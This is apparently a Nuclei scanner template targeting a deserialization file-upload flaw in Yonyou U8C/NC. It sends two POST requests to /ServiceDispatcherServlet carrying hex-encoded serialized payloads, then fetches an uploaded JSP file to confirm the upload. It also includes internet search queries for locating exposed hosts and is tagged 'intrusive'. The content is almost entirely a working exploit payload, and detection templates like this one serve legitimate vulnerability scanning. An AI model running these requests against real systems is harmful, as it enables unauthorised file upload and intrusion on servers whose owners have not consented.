id: yongyou-u8c-IPFxxFileService-deserialization-fileupload

info:
  name: Yonyou NC IPFxxFileService deserialization - Arbitrary File Upload
  author: adeljck
  severity: critical
  description: |
    Yonyou NC ServiceDispatcherServlet deserialization throgh nc.itf.uap.pfxx.IPFxxFileService Class file upload vulnerability.
  reference:
    - https://mp.weixin.qq.com/s/k7l1cq0UeT2vD2bSXZQIQw
    - https://github.com/adeljck/YongYou-Exploit
  classification:
    cpe: cpe:2.3:a:yonyou:u8c:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: yonyou
    product: u8c
    version: 5.0,5.01,5.011,5.02,5.3,5.5,5.6,5.7,5.75,6.0,6.1,6.3
    hunter-query: title:"U8C"
    fofa-query: app="用友-U8C"
  tags: yonyou,intrusive,fileupload,IPFxxFileService,deserialization

http:
  - raw:
      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Content-Type: application/data
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

        {{hex_decode("000001dc727189017bb903db14fb963164bade124a6345abafa416d11a7798a49640e0cc877db0c28918805c6b48125e6da6cf72c3cd2ddc4cd2082a64824bfc21deb7b2948b078b86c699d1f3aae33fcc2acc6bacd3e8fa3b421f296e271a3c5ac34455338c4a9b54be0f6f57e98199bc411aa8c3c9309e16ffd0b0b64a0b61e3729c35e93ba186b132e2df44d7645234809976748015375b35fa445f2e4d8cfec68d36ecf12e71b3d7011fe266828a7886739460f58f16e9f86e914f69568c86d2ff50841cbcad63f50c641890781e3c5982175d66b4fd2714169030ac44deb85abf6b05cf19f1775dba169a9075041a36419d5a84529062c86b67bac37b9680d8bf156e17baa3cc7c52106a76a66c99022ba992c0f5ad692e59140a4f07d1775dba169a9075048804978444c915ce8478c9bbf2a9d3f4e0a6cd5c50bfa0b6623081c2d0eb7f6fec9f9a5befd5152763964e382f3e001e8d65feea56547408953ca1ac926194afe8b5e1db0109a44af8cf648a323815344763cd599d8d7a92e11197c8f793e9fb69b5398d103271a03bdd0cc9fda2016e03cec2ad31b8f3364ac12ffefb63f20cfa7195bf815a11a14bf19db7663575e89844c0c38d800b3bf8cd07e96b58e694a8c060536a806dd611f82bdbce557cf14a4272fdb0b09b96")}}
      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Content-Type: application/data
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

        {{hex_decode("000001dc727189017bb903db14fb963164bade124a6345abafa416d11a7798a49640e0cc877db0c28918805c6b48125e6da6cf72c3cd2ddc4cd2082a64824bfc21deb7b2948b078b86c699d1f3aae33fcc2acc6bacd3e8fa3b421f296e271a3c5ac34455338c4a9b54be0f6f57e98199bc411aa8c3c9309e16ffd0b0b64a0b61e3729c35e93ba186b132e2df44d7645234809976748015377bd467fefec39252915508480f9484a5dae6c630259074f717992eefda9c356a8cd0574fa059852386d2ff50841cbcad63f50c641890781e3c5982175d66b4fd2714169030ac44deb85abf6b05cf19f1775dba169a9075041a36419d5a84529062c86b67bac37b9680d8bf156e17baa3cc7c52106a76a66c99022ba992c0f5ad692e59140a4f07d1775dba169a9075048804978444c915ce8478c9bbf2a9d3f4e0a6cd5c50bfa0b6623081c2d0eb7f6fec9f9a5befd5152763964e382f3e001e8d65feea56547408953ca1ac926194afe8b5e1db0109a44af8cf648a323815344763cd599d8d7a92e11197c8f793e9fb69b5398d103271a03bdd0cc9fda2016e03cec2ad31b8f3364ac12ffefb63f20cfa7195bf815a11a14bf19db7663575e89844c0c38d800b3bf8cd07e96b58e694a8c060536a806dd611f82bdbce557cf14a4272fdb0b09b96")}}
      - |
        GET /DnxS4EQx.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
    # check first response body length
      - type: dsl
        dsl:
          - "len(body_0) <= 299"
    # check second response body length
      - type: dsl
        dsl:
          - "len(body_1) <= 299"
      - type: dsl
        dsl:
          - "status_code_3 == 200 && contains(body_3, 'For Nuclei Test') && (contains(all_headers_3, 'Nuclei:Test') || contains(all_headers_3, 'Nuclei: Test'))"
